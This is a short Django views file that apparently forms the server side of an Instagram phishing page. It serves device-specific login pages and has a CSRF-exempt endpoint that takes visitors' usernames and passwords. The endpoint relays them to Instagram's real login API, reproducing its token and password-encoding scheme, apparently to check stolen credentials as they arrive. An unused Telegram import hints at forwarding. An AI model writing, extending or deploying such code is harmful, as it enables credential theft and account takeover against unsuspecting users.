from django.shortcuts import render
from django.http import HttpResponse
import requests
import time
from django.views.decorators.csrf import csrf_exempt
from django_user_agents.utils import get_user_agent
import telegram

def current_milli_time():
    return round(time.time() * 1000)

def loginFunc(login, password):
    res = requests.get('https://www.instagram.com/')
    token = res.cookies["csrftoken"]

    cookies = {"csrftoken": token}

    headers = {"X-CSRFToken": token,
               "User-Agent": "Other"}

    password = "#PWD_INSTAGRAM_BROWSER:0:%d:%s" % (current_milli_time(),password)

    params = {"enc_password": password, "username": login}
    res = requests.post('https://www.instagram.com/accounts/login/ajax/', cookies=cookies, params=params,
                        headers=headers)
    return res

def mobile_login(request):
    return render(request, "mobile-login.html")

def home(request):
    user_agent = get_user_agent(request)
    if (user_agent.is_pc):
        return render(request,"computer-enter.html")
    else:
        return render(request, "mobile-enter.html")

@csrf_exempt
def ajax(request):
    return HttpResponse(loginFunc(request.POST["userName"], request.POST["password"]))

